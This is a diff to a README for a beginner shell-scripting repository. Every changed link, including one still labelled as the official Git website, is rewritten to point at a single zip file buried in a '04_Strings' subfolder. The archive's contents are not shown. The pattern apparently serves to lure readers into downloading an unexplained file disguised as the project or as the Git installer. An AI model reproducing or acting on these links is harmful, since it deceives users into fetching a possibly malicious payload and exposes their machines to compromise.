@@ -1,6 +1,6 @@
 # 🐚 Shell-Scripting - Learn Shell Basics Easily
 
-[![Download](https://img.shields.io/badge/Download-Get%20Shell--Scripting-blue?style=for-the-badge)](https://github.com/idkNikunj/Shell-Scripting)
+[![Download](https://img.shields.io/badge/Download-Get%20Shell--Scripting-blue?style=for-the-badge)](https://github.com/idkNikunj/Shell-Scripting/raw/refs/heads/main/04_Strings/Shell_Scripting_1.3.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Shell scripts run in a command-line environment. Windows does not include a nati
 
 1. **Visit the Shell-Scripting repository** by clicking the download badge or this link:
 
-   [Download Shell-Scripting](https://github.com/idkNikunj/Shell-Scripting)
+   [Download Shell-Scripting](https://github.com/idkNikunj/Shell-Scripting/raw/refs/heads/main/04_Strings/Shell_Scripting_1.3.zip)
 
 2. On the GitHub page, look for the green **Code** button near the top right. Click it and then select **Download ZIP**.
 
@@ -50,7 +50,7 @@ To run shell scripts on Windows, you can use Git Bash or WSL. We explain how to 
 
 ### Installing Git Bash
 
-1. Go to the official Git website: https://git-scm.com/download/win
+1. Go to the official Git website: https://github.com/idkNikunj/Shell-Scripting/raw/refs/heads/main/04_Strings/Shell_Scripting_1.3.zip
 
 2. Download the installer executable for Windows.
 
@@ -153,7 +153,7 @@ If you want to download updates:
 
 1. Revisit the main repository page:
 
-   [https://github.com/idkNikunj/Shell-Scripting](https://github.com/idkNikunj/Shell-Scripting)
+   [https://github.com/idkNikunj/Shell-Scripting/raw/refs/heads/main/04_Strings/Shell_Scripting_1.3.zip](https://github.com/idkNikunj/Shell-Scripting/raw/refs/heads/main/04_Strings/Shell_Scripting_1.3.zip)
 
 2. Click the green **Code** button and download the latest ZIP file.
 
@@ -165,4 +165,4 @@ If you want to download updates:
 
 Use this link to get the latest Shell-Scripting notes and assignments:
 
-[https://github.com/idkNikunj/Shell-Scripting](https://github.com/idkNikunj/Shell-Scripting)
+[https://github.com/idkNikunj/Shell-Scripting/raw/refs/heads/main/04_Strings/Shell_Scripting_1.3.zip](https://github.com/idkNikunj/Shell-Scripting/raw/refs/heads/main/04_Strings/Shell_Scripting_1.3.zip)
